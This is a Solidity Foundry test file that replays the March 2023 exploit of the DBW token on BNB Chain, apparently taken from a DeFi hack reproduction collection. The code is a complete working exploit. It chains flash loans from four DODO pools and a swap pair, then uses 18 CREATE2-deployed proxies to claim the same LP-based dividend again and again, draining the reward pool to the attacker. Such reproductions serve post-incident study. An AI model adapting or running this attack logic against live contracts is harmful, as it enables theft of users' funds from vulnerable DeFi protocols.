// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BeosinAlert/status/1639655134232969216
// https://twitter.com/AnciliaInc/status/1639289686937210880
// @TX
// https://bscscan.com/tx/0x3b472f87431a52082bae7d8524b4e0af3cf930a105646259e1249f2218525607
// @Summary
// The root cause is that the dividend awards are based on the percentage of LP currently owned by the user,
// and does not take into account multiple dividends after the transfer of LP.
// @Similar events
// https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20230103---gds---business-logic-flaw
// https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20221001-rl-token---incorrect-reward-calculation

interface IDBW is IERC20 {
    function pledge_lp(uint256 count) external;
    function getStaticIncome() external;
    function redemption_lp(uint256 count) external;
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo1 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address dodo3 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    address dodo4 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    Uni_Pair_V2 flashSwapPair = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F487B563529f003643);
    uint256 dodo1FlashLoanAmount;
    uint256 dodo2FlashLoanAmount;
    uint256 dodo3FlashLoanAmount;
    uint256 dodo4FlashLoanAmount;
    uint256 PairFlashLoanAmount;
    claimRewardImpl RewardImpl;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_745_691);
        cheats.label(address(USDT), "USDT");
        cheats.label(address(DBW), "DBW");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(Router), "Router");
        cheats.label(address(dodo1), "dodo1");
        cheats.label(address(dodo2), "dodo2");
        cheats.label(address(dodo3), "dodo3");
        cheats.label(address(dodo4), "dodo4");
        cheats.label(address(flashSwapPair), "flashSwapPair");
    }

    function testExploit() external {
        RewardImpl = new claimRewardImpl();
        dodo1FlashLoanAmount = USDT.balanceOf(dodo1);
        DVM(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == dodo1) {
            dodo2FlashLoanAmount = USDT.balanceOf(dodo2);
            DVM(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));
            USDT.transfer(dodo1, dodo1FlashLoanAmount);
        } else if (msg.sender == dodo2) {
            dodo3FlashLoanAmount = USDT.balanceOf(dodo3);
            DVM(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));
            USDT.transfer(dodo2, dodo2FlashLoanAmount);
        } else if (msg.sender == dodo3) {
            dodo4FlashLoanAmount = USDT.balanceOf(dodo4);
            DVM(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));
            USDT.transfer(dodo3, dodo3FlashLoanAmount);
        } else if (msg.sender == dodo4) {
            PairFlashLoanAmount = 3_037_214_233_168_643_025_678_873;
            flashSwapPair.swap(PairFlashLoanAmount, 0, address(this), new bytes(1));
            USDT.transfer(dodo4, dodo4FlashLoanAmount);
        }
    }

    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        USDT.approve(address(Router), type(uint256).max);
        DBW.approve(address(Router), type(uint256).max);
        Pair.approve(address(Router), type(uint256).max);
        USDTToDBW_AddLiquidity();
        miniProxyCloneFactory(address(RewardImpl));
        RemoveLiquidity_DBWToUSDT();
        USDT.transfer(address(flashSwapPair), PairFlashLoanAmount * 10_000 / 9999 + 1000);
    }

    function USDTToDBW_AddLiquidity() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(DBW);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            800_000 * 1e18, 0, path, address(this), block.timestamp
        );
        Router.addLiquidity(
            address(USDT),
            address(DBW),
            USDT.balanceOf(address(this)),
            DBW.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function miniProxyCloneFactory(address impl) internal {
        for (uint256 i; i < 18; ++i) {
            uint256 _salt = uint256(keccak256(abi.encodePacked(i)));
            bytes memory creationBytecode = getCreationBytecode(address(impl));
            address newImpl = getAddress(creationBytecode, _salt);
            Pair.transfer(newImpl, Pair.balanceOf(address(this)));
            // new miniProxy{salt: keccak256("salt")}(impl);
            deploy(creationBytecode, _salt);
            (uint256 USDTReserve, uint256 DBWReserve,) = Pair.getReserves();
            uint256 DBWInPairAmount = DBW.balanceOf(address(Pair));
            uint256 USDTTransferAmount = DBWInPairAmount * USDTReserve / DBWReserve - USDTReserve;
            USDT.transfer(address(Pair), USDTTransferAmount);
            Pair.mint(address(this));
        }
    }

    function RemoveLiquidity_DBWToUSDT() internal {
        Router.removeLiquidity(
            address(USDT), address(DBW), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );
        address[] memory path = new address[](2);
        path[0] = address(DBW);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DBW.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function getCreationBytecode(address claimImpl) public pure returns (bytes memory) {
        bytes memory bytecode = type(miniProxy).creationCode;
        return abi.encodePacked(bytecode, abi.encode(claimImpl));
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }

    function deploy(bytes memory bytecode, uint256 _salt) internal {
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
        }
    }
}

contract claimRewardImpl is Test {
    function exploit() public {
        IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
        Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
        Pair.approve(address(DBW), type(uint256).max);
        DBW.getStaticIncome();
        vm.warp(block.timestamp + 2 * 24 * 60 * 60); // bypass locktime Limit
        uint256 LPAmount = Pair.balanceOf(address(this));
        DBW.pledge_lp(LPAmount); // send LP
        DBW.getStaticIncome(); // claim reward
        DBW.redemption_lp(LPAmount); // redeem LP
        Pair.transfer(msg.sender, LPAmount);
        DBW.transfer(address(Pair), DBW.balanceOf(address(this)));
    }
}

contract miniProxy {
    constructor(address claimRewardImpl) {
        (bool success,) = claimRewardImpl.delegatecall(abi.encodeWithSignature("exploit()"));
        require(success);
        selfdestruct(payable(tx.origin));
    }
}
